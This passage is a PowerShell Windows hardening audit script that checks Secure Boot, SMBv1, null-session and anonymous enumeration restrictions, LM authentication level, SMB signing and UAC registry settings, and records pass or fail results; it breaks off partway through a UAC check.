Get-ProcessInfo | Select-Object Name, Owner, ID, Path, CommandLine | Export-Csv -Path ".\CSV\Processes.csv" -NoTypeInformation 

####################### BIOS ###################################################
$strSecurityItem = "Hardware Security - BIOS" #ToDo
$strSecurityItemCheck = "Secure Boot should be enabled"
Write-Host '###############################' -BackgroundColor Black
Write-Host '##       BIOS Information    ##' -BackgroundColor Black
Write-Host '###############################' -BackgroundColor Black
Write-Host "BIOS Information" -ForegroundColor Black -BackgroundColor White
Get-WmiObject -Class win32_bios |Select-Object SMBIOSBIOSVersion, Manufacturer, Name, SerialNumber, Version | Format-List
Write-Host "Checking if Secure Boot is enabled" -ForegroundColor Black -BackgroundColor White
$securebootUEFI=$false
$secBootError=$false
Try
{
	$securebootUEFI = Confirm-SecureBootUEFI
}
Catch { 
    $strAuditCheckResult='Secure Boot is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
    $secBootError=$true
}

if ($securebootUEFI) 
{
    $strAuditCheckResult='Secure Boot is enabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
    Write-Host  -ForegroundColor Green
    
    Get-SecureBootPolicy
}
elseif (($secBootError -eq $false) -and (!($securebootUEFI))) {
    $strAuditCheckResult='Secure Boot is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
}

####################### Login Events ###################################################
Write-Host '#################################' -BackgroundColor Black
Write-Host '##    Explicit Logon Events    ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black
#Get-ExplicitLogonEvents | Format-Table

####################### SMBv1 ###################################################
$strSecurityItem = "SMB Security" #ToDo
$strSecurityItemCheck = "SMBv1 should be disabled"
Write-Host '#################################' -BackgroundColor Black
Write-Host '##          SMB v1             ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black

Try
{
	$smbV1State = (Get-WindowsOptionalFeature -Online -FeatureName smb1protocol).State
}
Catch { 
    Write-Host 'Error getting SMB v1 state' -ForegroundColor Red
}

if ($smbV1State) 
{
    $strAuditCheckResult='SMBv1 is enabled'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
    Get-WindowsOptionalFeature -Online -FeatureName smb1protocol | Format-Table
}
else
{
    $strAuditCheckResult='SMBv1 is disabled'
    Write-Host $strAuditCheckResult -ForegroundColor Green
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
    Get-WindowsOptionalFeature -Online -FeatureName smb1protocol | Format-Table
}

####################### Anonymous access to Named Pipes and Shares must be restricted ###################################################
$strSecurityItem = "SMB Security"
$strSecurityItemCheck = "Anonymous access to Named Pipes and Shares must be restricted"
Write-Host '##############################' -BackgroundColor Black
Write-Host '##    SMB - Null sessions   ##' -BackgroundColor Black
Write-Host '##############################' -BackgroundColor Black
Write-Host 'Checking if SMB Null sessions are restricted' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\"
$regPathProperty = "RestrictNullSessAccess"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Null Sessions are restricted'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Null Sessions are not restricted'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='Null Sessions are not restricted'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }





 ####################### Anonymous enumeration of SAM accounts should not be allowed. ###################################################
$strSecurityItem = "SMB Security"
$strSecurityItemCheck = "Anonymous enumeration of SAM accounts should not be allowed."
Write-Host '######################################' -BackgroundColor Black
Write-Host '##    Enumeration of SAM accounts   ##' -BackgroundColor Black
Write-Host '######################################' -BackgroundColor Black
Write-Host 'Checking if anonymous enumeration of SAM accounts is allowed.' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$regPathProperty = "RestrictAnonymousSAM"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Anonymous enumeration of SAM accounts is not allowed'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Anonymous enumeration of SAM accounts is allowed'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='Anonymous enumeration of SAM accounts is allowed'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

####################### Anonymous enumeration of shares must be restricted. ###################################################
$strSecurityItem = "SMB Security"
$strSecurityItemCheck = "Anonymous enumeration of shares must be restricted."

Write-Host '##########################################' -BackgroundColor Black
Write-Host '##    Anonymous enumeration of shares   ##' -BackgroundColor Black
Write-Host '##########################################' -BackgroundColor Black
Write-Host 'Checking if Anonymous enumeration of shares must be restricted.' -ForegroundColor Black -BackgroundColor White
## LSA Protection
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$regPathProperty = "RestrictAnonymous"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Anonymous enumeration of shares is restricted.'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Anonymous enumeration of shares is allowed'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='Anonymous enumeration of shares is allowed'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

####################### Driver Co-Installers ###################################################
$strSecurityItem = "Driver Co-Installers"
$strSecurityItemCheck = "Driver Co-Installers should be disabled to prevent privileged installation of vulnerable device drivers"
Write-Host '######################################' -BackgroundColor Black
Write-Host '##    Driver Co-Installers          ##' -BackgroundColor Black
Write-Host '######################################' -BackgroundColor Black
Write-Host 'Checking if Driver Co-Installers are disabled' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Installer\"
$regPathProperty = "DisableCoInstallers"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
        '1'
         {
            $strAuditCheckResult='Driver Co-Installers are disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }
         '0'
         {
            $strAuditCheckResult='Driver Co-Installers are enabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='Not set - Windows 10 Default: Driver Co-Installers are enabled'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

####################### LM Authentication Level ###################################################
$strSecurityItem = "SMB Security"
$strSecurityItemCheck = "The LanMan authentication level must be set to send NTLMv2 response only, and to refuse LM and NTLM."
Write-Host '######################################' -BackgroundColor Black
Write-Host '##    LanMan authentication level   ##' -BackgroundColor Black
Write-Host '######################################' -BackgroundColor Black
Write-Host 'Checking if LanMan authentication level is to send NTLMv2 response only, and to refuse LM and NTLM.' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$regPathProperty = "LmCompatibilityLevel"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '5' 
         {
            $strAuditCheckResult='The LanMan authentication level is set to send NTLMv2 response only, and to refuse LM and NTLM.'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '4' 
         {
            $strAuditCheckResult='Send NTLMv2 response only/refuse LM'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
         '3'
         {
            $strAuditCheckResult='Send NTLMv2 response only'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
         '2'
         {
            $strAuditCheckResult='Send NTLM response only'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
         '1'
         {
            $strAuditCheckResult='Send LM & NTLM - use NTLMv2 session security if negotiated.'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
         '0'
         {
            $strAuditCheckResult='Send LM & NTLM responses'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='Not set - Windows 10 Default: Send NTLMv2 response only'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

####################### SMB-Signing ###################################################
 $strSecurityItem = "SMB Security" #ToDo
Write-Host '#################################' -BackgroundColor Black
Write-Host '##         SMB-Signing         ##' -BackgroundColor Black
Write-Host '#################################' -BackgroundColor Black

$strSecurityItemCheck = "SMB-Signing should be enabled (Client)"
Write-Host 'Check if SMB-Signing is enabled (Client)' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\System\CurrentControlSet\Services\LanmanWorkstation\Parameters"
$regPathProperty = "EnableSecuritySignature"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='SMB-Signing is enabled (Client)'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
            Get-WindowsOptionalFeature -Online -FeatureName smb1protocol
         }
         '0' 
         {
            $strAuditCheckResult='SMB-Signing is disabled (Client)'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
            Get-WindowsOptionalFeature -Online -FeatureName smb1protocol
         }
     }
 } else {
    $strAuditCheckResult='SMB-Signing is disabled (Client)'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
    Get-WindowsOptionalFeature -Online -FeatureName smb1protocol
 }

$strSecurityItemCheck = "SMB-Signing should be enforced (Client)"
Write-Host 'Check if SMB-Signing is enforced (Client)' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\System\CurrentControlSet\Services\LanmanWorkstation\Parameters"
$regPathProperty = "RequireSecuritySignature"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='SMB-Signing is enforced (Client)'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='SMB-Signing is not enforced and can be downgraded (Client)'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
    $strAuditCheckResult='SMB-Signing is not enforced and can be downgraded (Client)'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

$strSecurityItemCheck = "SMB-Signing should be enabled (Server)"
Write-Host 'Check if SMB-Signing is enabled (Server)' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters"
$regPathProperty = "EnableSecuritySignature"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='SMB-Signing is enabled (Server)'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }
         '0' 
         {
            $strAuditCheckResult='SMB-Signing is disabled (Server)'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false 
         }
     }
 } else {
    $strAuditCheckResult='SMB-Signing is disabled (Server)'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false 
 }

 $strSecurityItemCheck = "SMB-Signing should be enforced (Server)"
Write-Host 'Check if SMB-Signing is enforced (server)' -ForegroundColor Black -BackgroundColor White
$regPath = "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters"
$regPathProperty = "RequireSecuritySignature"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='SMB-Signing is enforced (Server)'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='SMB-Signing is not enforced and can be downgraded (Server)'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
    $strAuditCheckResult='SMB-Signing is not enforced and can be downgraded (Server)'
    Write-Host $strAuditCheckResult -ForegroundColor Red
    Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }


####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Admin Approval Mode for the built-in Administrator account"
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Admin Approval Mode for the built-in Administrator account    ##' -BackgroundColor Black
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host 'Checking Admin Approval Mode for the built-in Administrator account' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "FilterAdministratorToken"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Admin Approval Mode for the built-in Administrator account is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Admin Approval Mode for the built-in Administrator account is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='Admin Approval Mode for the built-in Administrator account is disabled'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }


 ####################### UAC Settings ###################################################
 # https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop"
Write-Host '###############################################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Allow UIAccess applications to prompt for elevation without using the secure desktop    ##' -BackgroundColor Black
Write-Host '###############################################################################################################' -BackgroundColor Black
Write-Host 'Checking Allow UIAccess applications to prompt for elevation without using the secure desktop' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "EnableUIADesktopToggle"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Allow UIAccess applications to prompt for elevation without using the secure desktop is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false

         }
         '0' 
         {
            $strAuditCheckResult='Allow UIAccess applications to prompt for elevation without using the secure desktop is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }
     }
 } else {
        $strAuditCheckResult='Allow UIAccess applications to prompt for elevation without using the secure desktop is disabled'
        Write-Host $strAuditCheckResult -ForegroundColor Green
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
 }


####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode"
Write-Host '#####################################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Behavior of the elevation prompt for administrators in Admin Approval Mode    ##' -BackgroundColor Black
Write-Host '#####################################################################################################' -BackgroundColor Black
Write-Host 'Checking Behavior of the elevation prompt for administrators in Admin Approval Mode' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "ConsentPromptBehaviorAdmin"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '0' 
         {
            $strAuditCheckResult='Elevate without prompting'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }

         '1' 
         {
            $strAuditCheckResult='Prompt for credentials on the secure desktop'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '2' 
         {
            $strAuditCheckResult='Prompt for consent on the secure desktop'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false

         }
         '3' 
         {
            $strAuditCheckResult='Prompt for credentials without secure desktop'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false

         }
         '4' 
         {
            $strAuditCheckResult='Prompt for consent without secure desktop'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false

         }
         '5' 
         {
            $strAuditCheckResult='Prompt for consent for non-Windows binaries'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false

         }
     }
 } else {
        $strAuditCheckResult='(Default) Prompt for consent for non-Windows binaries'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }


 ####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Behavior of the elevation prompt for standard users"
Write-Host '################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Behavior of the elevation prompt for standard users      ##' -BackgroundColor Black
Write-Host '################################################################################' -BackgroundColor Black
Write-Host 'Checking Behavior of the elevation prompt for standard users' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "ConsentPromptBehaviorUser"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '0' 
         {
            $strAuditCheckResult='Automatically deny elevation requests'
            Write-Host $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
         }

         '1' 
         {
            $strAuditCheckResult='Prompt for credentials on the secure desktop'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false

         }
         '3' 
         {
            $strAuditCheckResult='Prompt for credentials without secure desktop'
            Write-Host  $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false

         }
     }
 } else {
        $strAuditCheckResult='(Default) Prompt for credentials without secure desktop'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Detect application installations and prompt for elevation"
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Detect application installations and prompt for elevation     ##' -BackgroundColor Black
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host 'Checking: User Account Control - Detect application installations and prompt for elevation' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "EnableInstallerDetection"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Detect application installations and prompt for elevation is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Detect application installations and prompt for elevation is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
         }
     }
 } else {
        $strAuditCheckResult='(Default) Detect application installations and prompt for elevation is disabled for Home Versions or Enabled for Enterprise Versions'
        Write-Host $strAuditCheckResult -ForegroundColor Red
        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
 }

 ####################### UAC Settings ###################################################
$strSecurityItem = "UAC Security"
$strSecurityItemCheck = "User Account Control: Only elevate executables that are signed and validated"
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host '##    UAC Security - Only elevate executables that are signed and validated        ##' -BackgroundColor Black
Write-Host '#####################################################################################' -BackgroundColor Black
Write-Host 'Checking: UAC - Only elevate executables that are signed and validated' -ForegroundColor Black -BackgroundColor White

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
$regPathProperty = "ValidateAdminCodeSignatures"

if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
    Switch($check)
    {
         '1' 
         {
            $strAuditCheckResult='Only elevate executables that are signed and validated is enabled'
            Write-Host  $strAuditCheckResult -ForegroundColor Green
            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true

         }
         '0' 
         {
            $strAuditCheckResult='Only elevate executables that are signed and validated is disabled'
            Write-Host $strAuditCheckResult -ForegroundColor Red
